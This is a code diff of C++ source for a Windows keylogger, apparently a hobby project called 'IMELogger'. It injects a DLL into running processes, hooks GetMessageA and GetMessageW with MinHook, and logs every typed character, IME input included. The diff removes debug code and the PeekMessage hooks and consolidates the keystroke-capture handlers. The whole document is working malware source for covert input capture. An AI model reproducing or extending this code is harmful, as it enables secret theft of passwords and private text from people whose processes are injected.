@@ -7,7 +7,7 @@
 #include <windows.h>
 
 // Minhook
-// For MinHook
+// Build MinHook and put lib file in the project directory
 #include "MinHook.h"
 #if defined _M_X64
 #pragma comment(lib, "libMinHook.x64.lib")
@@ -16,9 +16,7 @@
 #endif
 
 typedef BOOL(WINAPI* pGetMessageA)(LPMSG lpMsg, HWND hWnd, UINT wMsgFilterMin, UINT wMsgFilterMax);
-typedef BOOL(WINAPI* pPeekMessageA)(LPMSG lpMsg, HWND hWnd, UINT wMsgFilterMin, UINT wMsgFilterMax, UINT wRemoveMsg);
 typedef BOOL(WINAPI* pGetMessageW)(LPMSG lpMsg, HWND hWnd, UINT wMsgFilterMin, UINT wMsgFilterMax);
-typedef BOOL(WINAPI* pPeekMessageW)(LPMSG lpMsg, HWND hWnd, UINT wMsgFilterMin, UINT wMsgFilterMax, UINT wRemoveMsg);
 
 
 bool DLLinject(DWORD pid, const wchar_t* dllPath) {
@@ -77,7 +75,6 @@ bool DLLinject(DWORD pid, const wchar_t* dllPath) {
 }
 
 bool IMELoggerMain() {
-	IMElogger(L"IMELoggerMain Start\r\n");
 	wchar_t dllPath[MAX_PATH];
 	if (!getDLLPath(dllPath)) {
 		if (DEBUG)
@@ -92,6 +89,7 @@ bool IMELoggerMain() {
 	injectedPIDs.insert(0);
 
 
+	// If DEBUG is true,only inject to this debug process
 	wchar_t debugProcessName[] = L"Notepad.exe";
 
 	char lastTitle[256] = "";
@@ -105,26 +103,8 @@ bool IMELoggerMain() {
 			continue;
 		}
 
-		// Ignore this = =
-		/* 
-		GetWindowTextA(GetForegroundWindow() , currentTitle, sizeof(currentTitle));
-		
-		if (strcmp(currentTitle, lastTitle) != 0)
-		{
-			IMEKeyInputlogger(L"\r\n");
-
-			TCHAR titleMsgBuffer[512];
-
-			wsprintf(titleMsgBuffer, L"%s", currentTitle);
-			IMEKeyInputlogger(titleMsgBuffer);
-
-
-			strcpy_s(lastTitle, currentTitle);
-
-		}
-		*/
-
 		if (injectedPIDs.find(targetPID) == injectedPIDs.end()) {
+
 			if (DEBUG) {
 				// only injection to debug process
 				std::wstring processName;
@@ -141,6 +121,7 @@ bool IMELoggerMain() {
 				}
 				continue;
 			}
+
 			// If pid not in set, inject to pid
 			DLLinject(targetPID, dllPath);
 			injectedPIDs.insert(targetPID);
@@ -161,8 +142,6 @@ bool IMELoggerMain() {
 
 pGetMessageA fpGetMessageA = NULL;
 pGetMessageW  fpGetMessageW = NULL;
-pPeekMessageW fpPeekMessageW = NULL;
-pPeekMessageA fpPeekMessageA = NULL;
 
 // GetMessage
 BOOL WINAPI detourGetMessageW(LPMSG lpMsg, HWND hWnd, UINT wMsgFilterMin, UINT wMsgFilterMax) {
@@ -171,60 +150,52 @@ BOOL WINAPI detourGetMessageW(LPMSG lpMsg, HWND hWnd, UINT wMsgFilterMin, UINT w
 	/*
 	// Save message to IMEKeyInputlog
 	*/
-	TCHAR ch = static_cast<TCHAR>(lpMsg->lParam);
 	TCHAR msgBuffer[512];
-	TCHAR imeDescription[256];
 
 	if (result > 0 && lpMsg)
 	{
-		if (DEBUGFILE) {
-			DWORD msg = lpMsg->message;
-			wchar_t buffer[32];
-			swprintf(buffer, sizeof(buffer) / sizeof(wchar_t), L"\r\nK_code 0x%04X , %X , %X ", msg, lpMsg->wParam, lpMsg->lParam );
-			IMElpmsglogger(buffer);
-		}
-		//IMEKeyInputlogger(L"`");
 		switch (lpMsg->message)
 		{
-
-		case WM_CHAR:
-			// print ch to IMEKeyInputlog
-			
-			/*
-			if (DEBUG) {
-				//print all message lpMsg data
-                wsprintf(msgBuffer, L" lpMsg->message: %X\r\nlpMsg->wParam: %X\r\nlpMsg->lParam: %llX\r\n", lpMsg->message, lpMsg->wParam, static_cast<unsigned long long>(lpMsg->lParam));
-				MessageBoxW(NULL, msgBuffer, L"WM_CHAR", MB_OK);
-			}
-			*/
-			if (lpMsg->lParam == 1) {
-				// if lParam is 1, lpMsg->wParam is unicode
-				wsprintf(msgBuffer, L"%c", lpMsg->wParam);
-				IMEKeyInputlogger(msgBuffer);
-
-			}
-			else if(lpMsg->wParam < 0x10000) {
-				wsprintf(msgBuffer, L"%c", lpMsg->wParam);
-				IMEKeyInputlogger(msgBuffer);
-	
-			}
-			
-			break; 
-
 		case WM_IME_CHAR:
-		{
-			if (DEBUG) {
-				//print all message lpMsg data
-				wsprintf(msgBuffer, L" lpMsg->message: %X\r\nlpMsg->wParam: %X\r\nlpMsg->lParam: %llX\r\n", lpMsg->message, lpMsg->wParam, static_cast<unsigned long long>(lpMsg->lParam));
-				MessageBoxW(NULL, msgBuffer, L"WM_IME_CHAR", MB_OK);
+		case WM_CHAR:
+			// If wParam is UNICODE, lParam will be 1
+			if (lpMsg->lParam == 1 || lpMsg->wParam < 0x10000) {
+				wsprintf(msgBuffer, L"%c", lpMsg->wParam);
+				IMEKeyInputlogger(msgBuffer);
 			}
-			IMEKeyInputlogger(L"-");
-			MessageBoxA(NULL, "IME_CHAR", "IME_CHAR", MB_OK);
-		}
-		break;
-		
-		break;
 
+			break;
+
+		default:
+			break;
+		}
+	}
+
+	return result;
+}
+
+// I copy detourGetMessageW, and change function name and parameter
+BOOL WINAPI detourGetMessageA(LPMSG lpMsg, HWND hWnd, UINT wMsgFilterMin, UINT wMsgFilterMax) {
+	// Call original function
+	BOOL result = fpGetMessageA(lpMsg, hWnd, wMsgFilterMin, wMsgFilterMax);
+	/*
+	// Save message to IMEKeyInputlog
+	*/
+	TCHAR msgBuffer[512];
+
+	if (result > 0 && lpMsg)
+	{
+		switch (lpMsg->message)
+		{
+		case WM_IME_CHAR:
+		case WM_CHAR:
+			// If wParam is UNICODE, lParam will be 1
+			if (lpMsg->lParam == 1 || lpMsg->wParam < 0x10000) {
+				wsprintf(msgBuffer, L"%c", lpMsg->wParam);
+				IMEKeyInputlogger(msgBuffer);
+			}
+
+			break;
 
 		default:
 			break;
@@ -235,37 +206,6 @@ BOOL WINAPI detourGetMessageW(LPMSG lpMsg, HWND hWnd, UINT wMsgFilterMin, UINT w
 }
 
 
-BOOL WINAPI detourGetMessageA(LPMSG lpMsg, HWND hWnd, UINT wMsgFilterMin, UINT wMsgFilterMax) {
-	// Call original function
-	BOOL result = fpGetMessageA(lpMsg, hWnd, wMsgFilterMin, wMsgFilterMax);
-	// Save message to IMEKeyInputlog
-	MessageBoxA(NULL, "GetMessageAAAAAAAAAAAAAAAAAAAAAAA", "GetMessageA", MB_OK);
-
-	return result;
-}
-
-// PeekMessage
-BOOL WINAPI detourPeekMessageW(LPMSG lpMsg, HWND hWnd, UINT wMsgFilterMin, UINT wMsgFilterMax, UINT wRemoveMsg) {
-	// Call original function
-	BOOL result = fpPeekMessageW(lpMsg, hWnd, wMsgFilterMin, wMsgFilterMax, wRemoveMsg);
-	/*
-	// Save message to IMEKeyInputlog
-	const wchar_t* originalText = (const wchar_t*)lpMsg->lParam;
-	IMEKeyInputlogger(originalText);
-	*/
-	return result;
-}
-
-
-BOOL WINAPI detourPeekMessageA(LPMSG lpMsg, HWND hWnd, UINT wMsgFilterMin, UINT wMsgFilterMax, UINT wRemoveMsg) {
-	// Call original function
-	BOOL result = fpPeekMessageA(lpMsg, hWnd, wMsgFilterMin, wMsgFilterMax, wRemoveMsg);
-	// Save message to IMEKeyInputlog
-	const char* originalText = (const char*)lpMsg->lParam;
-	IMEKeyInputlogger((wchar_t*)originalText);
-
-	return result;
-}
 
 // injected process main
 
@@ -277,7 +217,6 @@ bool injectProcessMain() {
 		DEBUGlogger(std::to_wstring(currentPID).c_str());
 	}
 
-	IMElpmsglogger(L"K_code, wParam, lParam\r\n");
 
 	wchar_t dllPath[MAX_PATH];
 	if (!getDLLPath(dllPath)) {
@@ -300,48 +239,36 @@ bool injectProcessMain() {
 		return false;
 	}
 	void* pGetMessageA = (void*)GetProcAddress(hDLL, "GetMessageA");
-	void* pPeekMessageA = (void*)GetProcAddress(hDLL, "PeekMessageA");
 	void* pGetMessageW = (void*)GetProcAddress(hDLL, "GetMessageW");
-	void* pPeekMessageW = (void*)GetProcAddress(hDLL, "PeekMessageW");
 
 
-	if ( !pGetMessageA || !pPeekMessageA || !pGetMessageW || !pPeekMessageW){
+	if (!pGetMessageA || !pGetMessageW) {
 		if (DEBUGFILE)
 			DEBUGlogger(L"injectProcessMain | Failed to get address of GetMessage or PeekMessage.\r\n");
 		return false;
 	}
 
 	// Create a hook 
-	{	
+	{
 		if (MH_CreateHook(pGetMessageA, &detourGetMessageA, reinterpret_cast<LPVOID*>(&fpGetMessageA)) != MH_OK)
 		{
 			if (DEBUGFILE)
 				DEBUGlogger(L"injectProcessMain | Failed to create hook for GetMessageA.\r\n");
 		}
-		if (MH_CreateHook(pPeekMessageA, &detourPeekMessageA, reinterpret_cast<LPVOID*>(&fpPeekMessageA)) != MH_OK)
-		{
-			if (DEBUGFILE)
-				DEBUGlogger(L"injectProcessMain | Failed to create hook for PeekMessageA.\r\n");
-		}
+
 		if (MH_CreateHook(pGetMessageW, &detourGetMessageW, reinterpret_cast<LPVOID*>(&fpGetMessageW)) != MH_OK)
 		{
 			if (DEBUGFILE)
 				DEBUGlogger(L"injectProcessMain | Failed to create hook for GetMessageW.\r\n");
 		}
-		if (MH_CreateHook(pPeekMessageW, &detourPeekMessageW, reinterpret_cast<LPVOID*>(&fpPeekMessageW)) != MH_OK)
-		{
-			if (DEBUGFILE)
-				DEBUGlogger(L"injectProcessMain | Failed to create hook for PeekMessageW.\r\n");
-		}
+
 	}
 	/*
 	MH_EnableHook(pGetMessage);
 	MH_EnableHook(pPeekMessage);
 	*/
 	MH_EnableHook(pGetMessageA);
-	MH_EnableHook(pPeekMessageA);
 	MH_EnableHook(pGetMessageW);
-	MH_EnableHook(pPeekMessageW);
 
 
 	if (DEBUGFILE) {
